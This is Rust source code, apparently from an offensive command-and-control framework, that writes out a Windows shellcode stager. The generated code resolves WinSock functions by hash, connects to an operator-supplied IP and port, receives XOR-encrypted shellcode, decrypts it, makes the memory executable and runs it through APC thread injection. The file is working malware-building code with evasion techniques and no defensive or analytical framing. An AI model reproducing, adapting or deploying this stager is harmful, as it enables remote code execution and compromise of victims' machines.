use super::utils::{djb2_hash, INSTANCE_TEMPLATE_PATH, TARGET_INSTANCE_PATH};
use crate::config::{GenerateArch, PulseConfig, Version};

pub fn generate_tcp_pulse(
    config: PulseConfig,
    _arch: GenerateArch,
    _version: &Version,
    _source: bool,
) -> anyhow::Result<()> {
    let template_path = std::path::Path::new(INSTANCE_TEMPLATE_PATH);
    if !template_path.exists() {
        anyhow::bail!("Instance template not found: {}", INSTANCE_TEMPLATE_PATH);
    }
    let template = std::fs::read_to_string(template_path)?;

    let url = &config.target;
    if url.is_empty() {
        anyhow::bail!("target url is empty.");
    }
    let colon_pos = url
        .find(':')
        .ok_or_else(|| anyhow::anyhow!("invalid target format, expected ip:port"))?;
    let (ip, port_str) = url.split_at(colon_pos);
    let port: u16 = port_str[1..].parse()?;

    let magic = djb2_hash(&config.flags.magic);
    let key = &config.key;
    let iv: String = key.chars().rev().collect();

    let key_bytes = format_byte_literals(key.as_bytes());
    let iv_bytes = format_byte_literals(iv.as_bytes());
    let ip_bytes = format_byte_literals(ip.as_bytes());

    let start_method = format!(
        r#"    pub unsafe fn start(&self, _args: *mut c_void) {{
        fn xor_process(data: &mut [u8], key: &[u8], iv: &[u8], counter: &mut usize) {{
            for byte in data.iter_mut() {{
                *byte ^= key[*counter % key.len()] ^ iv[*counter % iv.len()];
                *counter += 1;
            }}
        }}

        // Load ws2_32.dll
        let dll_name: [u8; 11] = [b'w', b's', b'2', b'_', b'3', b'2', b'.', b'd', b'l', b'l', 0];
        let load_lib: FnLoadLibraryA = core::mem::transmute(self.kernel32.LoadLibraryA);
        let ws2 = load_lib(dll_name.as_ptr() as *mut u8);
        if ws2.is_null() {{ return; }}
        let ws2_base = ws2 as usize;

        // Resolve WinSock APIs via hash
        let wsa_startup: FnWSAStartup = core::mem::transmute(
            resolve::_api(ws2_base, hash_str!("WSAStartup") as usize));
        let p_socket: FnSocket = core::mem::transmute(
            resolve::_api(ws2_base, hash_str!("socket") as usize));
        let p_connect: FnConnect = core::mem::transmute(
            resolve::_api(ws2_base, hash_str!("connect") as usize));
        let p_send: FnSend = core::mem::transmute(
            resolve::_api(ws2_base, hash_str!("send") as usize));
        let p_recv: FnRecv = core::mem::transmute(
            resolve::_api(ws2_base, hash_str!("recv") as usize));
        let p_closesocket: FnClosesocket = core::mem::transmute(
            resolve::_api(ws2_base, hash_str!("closesocket") as usize));
        let p_inet_addr: FnInetAddr = core::mem::transmute(
            resolve::_api(ws2_base, hash_str!("inet_addr") as usize));
        let p_htons: FnHtons = core::mem::transmute(
            resolve::_api(ws2_base, hash_str!("htons") as usize));

        // WSAStartup
        let mut wsa_data: WSADATA = core::mem::zeroed();
        if wsa_startup(0x0202, &mut wsa_data) != 0 {{ return; }}

        // Create socket
        let sock = p_socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
        if sock == 0 || sock == usize::MAX {{ return; }}

        // Connect
        let ip_addr: [u8; {ip_len}] = [{ip_bytes}, 0];
        let addr = SOCKADDR_IN {{
            sin_family: AF_INET as i16,
            sin_port: p_htons({port}),
            sin_addr: IN_ADDR {{ s_addr: p_inet_addr(ip_addr.as_ptr()) }},
            sin_zero: [0; 8],
        }};
        if p_connect(sock, &addr, core::mem::size_of::<SOCKADDR_IN>() as i32) != 0 {{
            p_closesocket(sock);
            return;
        }}

        // Configuration
        let key: [u8; {key_len}] = [{key_bytes}];
        let iv: [u8; {iv_len}] = [{iv_bytes}];

        // Build handshake body: [start][magic:4][artifact_id:4][end]
        let mut body: [u8; 10] = [0; 10];
        body[0] = {start}u8;
        let m = {magic}u32.to_le_bytes();
        body[1] = m[0]; body[2] = m[1]; body[3] = m[2]; body[4] = m[3];
        let a = {artifact_id}u32.to_le_bytes();
        body[5] = a[0]; body[6] = a[1]; body[7] = a[2]; body[8] = a[3];
        body[9] = {end}u8;

        // Encrypt and send
        let mut counter: usize = 0;
        xor_process(&mut body, &key, &iv, &mut counter);
        let ret = p_send(sock, body.as_ptr(), 10, 0);
        if ret <= 0 {{ p_closesocket(sock); return; }}

        // Receive response header (9 bytes)
        let mut resp: [u8; 9] = [0; 9];
        let mut offset = 0usize;
        while offset < 9 {{
            let ret = p_recv(sock, resp.as_mut_ptr().add(offset), (9 - offset) as i32, 0);
            if ret <= 0 {{ p_closesocket(sock); return; }}
            offset += ret as usize;
        }}

        // Decrypt and validate
        counter = 0;
        xor_process(&mut resp, &key, &iv, &mut counter);
        if resp[0] != {start}u8 {{ p_closesocket(sock); return; }}
        let recv_magic = u32::from_le_bytes([resp[1], resp[2], resp[3], resp[4]]);
        let recv_len = u32::from_le_bytes([resp[5], resp[6], resp[7], resp[8]]);
        if recv_magic != {magic}u32 || recv_len == 0 {{ p_closesocket(sock); return; }}

        // Allocate memory for shellcode
        let mut base_addr: PVOID = core::ptr::null_mut();
        let mut region_size: SIZE_T = recv_len as usize + 1;
        let nt_alloc: FnNtAllocateVirtualMemory =
            core::mem::transmute(self.ntdll.NtAllocateVirtualMemory);
        let status = nt_alloc(
            -1isize as HANDLE, &mut base_addr, 0, &mut region_size,
            MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE,
        );
        if status != STATUS_SUCCESS || base_addr.is_null() {{
            p_closesocket(sock);
            return;
        }}

        // Receive shellcode
        let mut real_len = 0u32;
        loop {{
            let ret = p_recv(
                sock,
                (base_addr as *mut u8).add(real_len as usize),
                (recv_len - real_len + 1) as i32,
                0,
            );
            if ret <= 0 {{ p_closesocket(sock); return; }}
            real_len += ret as u32;
            if real_len >= recv_len + 1 {{ break; }}
        }}
        p_closesocket(sock);

        // Decrypt shellcode
        xor_process(
            core::slice::from_raw_parts_mut(base_addr as *mut u8, recv_len as usize),
            &key, &iv, &mut counter,
        );

        // Change memory protection to executable
        let mut old_protect: ULONG = 0;
        let mut protect_base = base_addr;
        let mut protect_size = region_size;
        let nt_protect: FnNtProtectVirtualMemory =
            core::mem::transmute(self.ntdll.NtProtectVirtualMemory);
        nt_protect(
            -1isize as HANDLE, &mut protect_base, &mut protect_size,
            PAGE_EXECUTE_READ, &mut old_protect,
        );

        // Execute shellcode via APC injection
        let nt_create: FnNtCreateThreadEx =
            core::mem::transmute(self.ntdll.NtCreateThreadEx);
        let nt_queue: FnNtQueueApcThread =
            core::mem::transmute(self.ntdll.NtQueueApcThread);
        let nt_resume: FnNtAlertResumeThread =
            core::mem::transmute(self.ntdll.NtAlertResumeThread);
        let nt_wait: FnNtWaitForSingleObject =
            core::mem::transmute(self.ntdll.NtWaitForSingleObject);

        let mut thread_handle: HANDLE = core::ptr::null_mut();
        nt_create(
            &mut thread_handle, 0x1FFFFF, core::ptr::null_mut(),
            -1isize as HANDLE, base_addr, core::ptr::null_mut(),
            THREAD_CREATE_FLAGS_CREATE_SUSPENDED,
            0, 0, 0, core::ptr::null_mut(),
        );
        if thread_handle.is_null() {{ return; }}

        nt_queue(
            thread_handle, base_addr,
            core::ptr::null_mut(), core::ptr::null_mut(), core::ptr::null_mut(),
        );

        let mut suspend_count: ULONG = 0;
        nt_resume(thread_handle, &mut suspend_count);
        nt_wait(thread_handle, 0, core::ptr::null_mut());
    }}"#,
        ip_len = ip.len() + 1, // +1 for null terminator in the array type
        ip_bytes = ip_bytes,
        port = port,
        key_len = key.len(),
        key_bytes = key_bytes,
        iv_len = iv.len(),
        iv_bytes = iv_bytes,
        start = config.flags.start,
        end = config.flags.end,
        magic = format!("0x{:08x}", magic),
        artifact_id = config.flags.artifact_id,
    );

    let instance_rs = format!("{}\n{}\n}}\n", template, start_method);
    let target_path = std::path::Path::new(TARGET_INSTANCE_PATH);
    std::fs::write(target_path, instance_rs)?;

    Ok(())
}

fn format_byte_literals(bytes: &[u8]) -> String {
    bytes
        .iter()
        .map(|b| format!("0x{:02x}", b))
        .collect::<Vec<_>>()
        .join(", ")
}
